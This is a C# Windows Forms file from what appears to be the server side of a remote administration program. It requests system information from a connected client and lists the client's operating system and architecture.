using Serveur.Controllers.Server;
using System;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmSystemInformation : Form
    {
        private readonly ClientMosaic _client;

        public FrmSystemInformation(ClientMosaic client)
        {
            _client = client;
            _client.value.frmSi = this;
            InitializeComponent();
        }

        private void FrmSystemInformation_Load(object sender, System.EventArgs e)
        {
            if(_client != null)
            {
                new Packets.ServerPackets.GetSysInfo().Execute(_client);

                if(_client.value != null)
                {
                    ListViewItem lvi = new ListViewItem(new string[] { "Operating System", _client.value.operatingSystem });
                    lvSysInfo.Items.Add(lvi);
                    lvi = new ListViewItem(new string[] { "Architecture", (_client.value.operatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)" });
                    lvSysInfo.Items.Add(lvi);
                    lvi = new ListViewItem(new string[] { "", "Getting more information..." });
                    lvSysInfo.Items.Add(lvi);
                }
            }
        }

        public void addItems(ListViewItem[] lviCollection)
        {
            try
            {
                lvSysInfo.Invoke((MethodInvoker)delegate
                {
                    lvSysInfo.Items.RemoveAt(2); // Loading... Information

                    foreach (var lviItem in lviCollection)
                    {
                        if (lviItem != null)
                            lvSysInfo.Items.Add(lviItem);
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}
